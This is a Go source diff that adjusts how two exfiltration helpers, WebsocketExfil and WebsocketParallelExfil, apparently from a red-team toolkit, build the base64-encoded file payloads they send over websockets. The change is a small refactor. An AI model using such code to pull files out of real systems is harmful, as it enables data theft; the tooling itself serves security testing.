@@ -496,9 +496,15 @@ func WebsocketExfil(
 	}
 
 	f = func(path string, b []byte) error {
-		var b64 []byte = []byte(base64.StdEncoding.EncodeToString(b))
-		var data []byte = append([]byte(path+" "), b64...)
+		var b64 string = base64.StdEncoding.EncodeToString(b)
+		var data []byte
 		var e error
+
+		if path != "" {
+			data = []byte(path + " " + b64)
+		} else {
+			data = []byte(b64)
+		}
 
 		m.Lock()
 		e = c.WriteMessage(ws.TextMessage, data)
@@ -542,9 +548,9 @@ func WebsocketParallelExfil(
 	}
 
 	f = func(path string, b []byte) error {
-		var b64 []byte = []byte(base64.StdEncoding.EncodeToString(b))
+		var b64 string = base64.StdEncoding.EncodeToString(b)
 		var c *ws.Conn
-		var data []byte = append([]byte(path+" "), b64...)
+		var data []byte
 		var e error
 
 		// Connect to Websocket
@@ -558,6 +564,12 @@ func WebsocketParallelExfil(
 			)
 			c.Close()
 		}()
+
+		if path != "" {
+			data = []byte(path + " " + b64)
+		} else {
+			data = []byte(b64)
+		}
 
 		return c.WriteMessage(ws.TextMessage, data)
 	}
